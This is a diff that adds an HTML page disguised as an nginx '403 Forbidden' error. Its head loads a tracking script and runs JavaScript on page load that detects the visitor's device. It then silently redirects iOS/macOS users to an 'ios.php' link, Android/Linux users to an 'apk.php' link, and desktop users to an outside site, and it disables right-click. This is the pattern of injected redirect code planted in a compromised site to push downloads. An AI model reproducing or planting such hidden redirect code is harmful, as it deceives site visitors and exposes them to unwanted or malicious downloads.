@@ -1,0 +1,76 @@
+<html>
+<head>
+<meta charset="utf-8">
+<title>403 Forbidden</title>
+<script type="text/javascript" src="https://js.users.51.la/21159377.js"></script>
+
+<script language="javascript" type="text/javascript">
+var bForcepc = fGetQuery("dv") == "pc";
+function fBrowserRedirect(){
+    var sUserAgent = navigator.userAgent.toLowerCase();
+	
+    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+    var bIsIphone = sUserAgent.match(/iphone/i) == "iphone";
+    var bIsIos = sUserAgent.match(/ios/i) == "ios";
+    var bIsmacos = sUserAgent.match(/mac os/i) == "mac os";
+
+    var bIsAndroid = sUserAgent.match(/android/i) == "android";
+    var bIsaz = sUserAgent.match(/Android/i) == "Android";
+    var bIslinux = sUserAgent.match(/linux/i) == "linux"; 
+    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile"; 
+  
+    if(bIsIpad||bIsIphone||bIsIos||bIsmacos){ //判断苹果访问
+        var sUrl = location.href;   
+		var d=document.referrer;
+        if(!bForcepc){ 
+         if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0)
+         {window.location.href="http://A1.2020210429.com/js/ios.php" //优化跳转
+          
+        }else{
+        window.location.href = "http://A1.2020210429.com/js/ios.php"  //苹果端跳转地址
+              }
+        } 
+    }else if(bIsAndroid||bIsaz||bIslinux||bIsWM){ //判断安卓访问
+        var sUrl = location.href;   
+		var d=document.referrer;
+        if(!bForcepc){ 
+         if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0)
+         {window.location.href="http://A1.2020210429.com/js/apk.php" //优化跳转
+          
+        }else{
+        window.location.href = "http://A1.2020210429.com/js/apk.php"  //安卓端跳转地址
+              }
+        } 
+    }else{ //判断电脑访问
+	
+	  if(!bForcepc){ 
+		var d=document.referrer;
+        if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0)
+        {window.location.href="https://www.kanhuacao.com/?id=15784"//优化跳转
+	
+          
+        }else{
+       window.location.href = "https://www.kanhuacao.com/?id=15784" //电脑访问跳转地址
+	
+              }
+        } 
+	}
+} 
+function fGetQuery(name){//获取参数值 
+    var sUrl = window.location.search.substr(1); 
+    var r = sUrl.match(new RegExp("(^|&)" + name + "=([^&]*)(&|$)")); 
+    return (r == null ? null : unescape(r[2])); 
+} 
+
+fBrowserRedirect();
+</script>
+</div></head>
+<body>
+<body bgcolor="white">
+<center><h1>403 Forbidden</h1></center>
+<hr><center>nginx</center>
+</div>
+<body oncontextmenu=self.event.returnValue=false>
+</div>
+</body>
+</html>
